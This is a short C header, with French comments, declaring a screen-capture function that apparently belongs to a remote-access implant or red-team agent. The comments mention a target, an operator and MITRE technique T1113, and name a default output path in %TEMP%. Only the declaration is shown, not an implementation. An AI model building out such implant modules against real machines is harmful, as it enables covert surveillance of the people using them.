#ifndef SCREENSHOT_H
#define SCREENSHOT_H

/*
** screenshot.h — Module de capture d'écran (ticket #39, MITRE T1113)
**
** Capture l'écran principal de la cible et l'encode en PNG sur disque
** via GDI+ (aucun processus externe, aucune dépendance additionnelle).
**
** Retourne une chaîne allouée (malloc) terminée par '\0' contenant le
** résultat lisible par l'opérateur (chemin du fichier, dimensions, taille),
** à libérer par l'appelant via free().
*/

/*
** Capture l'écran et écrit le PNG dans `path` (chemin Windows).
** Si `path` est NULL ou vide, écrit dans %TEMP%\shot.png.
** Retourne une chaîne malloc-ée décrivant le résultat, jamais NULL
** sauf échec d'allocation.
*/
char *screenshot_capture(const char *path);

#endif /* !SCREENSHOT_H */
